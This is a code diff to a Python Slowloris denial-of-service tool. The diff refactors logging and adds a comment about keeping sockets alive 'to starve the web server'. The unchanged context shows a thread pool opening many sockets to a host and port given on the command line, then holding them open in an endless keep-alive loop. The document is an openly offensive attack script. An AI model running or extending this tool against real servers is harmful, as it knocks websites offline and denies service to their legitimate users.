@@ -8,13 +8,8 @@ from random import randint
 from queue import Queue
 from threading import Thread
 
-logger = logging.getLogger()
-logger.setLevel(logging.DEBUG)
-
-handler = logging.StreamHandler(stdout)
-handler.setLevel(logging.INFO)
-
-logger.addHandler(handler)
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 
 class Worker(Thread):
@@ -76,18 +71,24 @@ class SlowLoris:
         '''
         self.sockets = []
         self._workers = []
+
+        logger.info('Attacking {} with {} sockets'.format(target[0], sock_count))
         self._sock_count = sock_count
         self.target = target
+
+        logger.info('Creating a thread pool of {} threads'.format(thread_count))
         self.pool = ThreadPool(thread_count)
 
     def connect_sockets(self):
         '''
         Creates the socket connections specified in `_sock_count` by adding the task to the queue and blocks until all sockets are created
         '''
+        logger.info('Creating {} sockets'.format(self._sock_count))
         for _ in range(self._sock_count):
             # Addding the task to the thread pool queue
             self.pool.add_task(self.init_socket)
         self.pool.wait_completion()
+        logger.info('Done creating {} sockets'.format(len(self.sockets)))
 
     def init_socket(self):
         '''
@@ -111,7 +112,7 @@ class SlowLoris:
                 self.sockets.append(sock)
         except socket.error:
             # Unable to establish connection, return gracefully
-            logger.info('Losing connection at {} sockets'.format(len(self.sockets)))
+            logger.debug('Losing connection at {} sockets'.format(len(self.sockets)))
             return
 
     def __enter__(self):
@@ -152,15 +153,11 @@ def main():
     parser.add_argument('--port', default=80, type=int)
     args = parser.parse_args()
 
-    logger.info('Attacking {} with {} sockets'.format(args.host, args.sock_count))
-
     # Initialize the SlowLoris object
-    logger.info('Creating a thread pool of {} threads'.format(args.thread_count))
     with SlowLoris((args.host, args.port), args.sock_count, args.thread_count) as slowloris:
-
-        logger.info('Creating {} sockets'.format(args.sock_count))
         slowloris.connect_sockets()
 
+        # Keep all the sockets alive to starve the web server
         while True:
             slowloris.keep_alive()
 
